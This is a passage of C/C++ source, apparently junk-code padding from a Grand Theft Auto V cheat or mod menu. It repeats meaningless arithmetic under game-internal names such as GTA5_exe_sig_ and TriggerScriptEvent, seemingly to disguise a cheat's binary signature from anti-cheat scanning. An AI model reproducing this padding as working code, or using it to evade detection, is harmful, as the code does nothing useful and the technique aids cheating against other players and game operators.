			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<ClearWorld>0</ClearWorld>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
